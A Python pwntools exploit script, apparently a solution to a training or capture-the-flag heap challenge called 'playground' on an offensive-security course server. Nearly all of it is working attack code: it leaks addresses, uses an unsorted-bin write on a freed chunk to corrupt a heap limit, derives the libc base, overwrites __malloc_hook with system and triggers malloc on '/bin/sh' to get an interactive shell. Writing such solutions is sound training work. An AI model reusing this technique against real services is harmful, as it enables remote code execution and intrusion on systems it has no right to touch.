#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 4010 playground
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('playground')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'bin.training.offdef.it'
port = int(args.PORT or 4110)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={'LD_PRELOAD': './libc-2.27.so'})

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
tbreak main
break *(main+368)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('./libc-2.27.so')

io = start()

io.recvuntil(b'pid: ')
pid = int(io.recvuntil(b'\n'))
io.recvuntil(b'main: ')
main = int(io.recvuntil(b'\n'), 0)

print('[!]pid = {}\n[!]main = {}'.format(pid, hex(main)))

def malloc(n):
	io.recvuntil('> ')
	io.sendline('malloc ' + str(n))
	io.recvuntil('==> ')
	return int(io.recvuntil(b'\n'), 0)

def free(p):
	io.recvuntil('> ')
	io.sendline('free ' + hex(p))
	io.recvuntil('==> ok')

def show(p, n=1, v=False):
	io.recvuntil('> ')
	io.sendline('show ' + hex(p) + ' ' + str(n))
	d = {}
	for i in range(n):
		pointer = int(io.recvuntil(b':')[:-1], 0)
		content = io.recvuntil(b'\n').strip(' ')
		#print('P = ' + str(pointer) + '; C = ' + content + ' len=' + str(len(content)))
		c = 0
		if len(content) != 1:
			c = int(content, 0)
		d[pointer] = c

	if v:
		for k in d:
			print(hex(k) + ': ' + hex(d[k]))

	return d

def write(p, content):
	io.recvuntil('> ')
	io.sendline('write ' + hex(p) + ' ' + str(len(content)))
	io.recvuntil(b'==> read\n')
	io.send(content)
	io.recvuntil(b'==> done\n')

a = malloc(0x410)
b = malloc(500) # discard

free(a)

target = main + 0x2ec7
print("[!]target: {}".format(hex(target)))
# write to max_heap location (target)
write(a + 8, p64(target - 0x10))

c = malloc(0x410) # discard

print("[!] now max_heap should be different!")

libc_leak = show(target, n=1, v=False)[target]

print("[!] leak: {}".format(hex(libc_leak)))

malloc_hook_location = libc_leak - 0x70
libc.address = malloc_hook_location - 0x3ebc30

bin_sh = next(libc.search(b'/bin/sh\0'))

print("[!] bin_sh: {}".format(hex(bin_sh)))

#write(c, p64(0xdeadbeef) + p64(bin_sh))
write(malloc_hook_location, p64(libc.symbols['system']))

io.recvuntil('> ')
io.sendline('malloc ' + str(bin_sh))

io.interactive()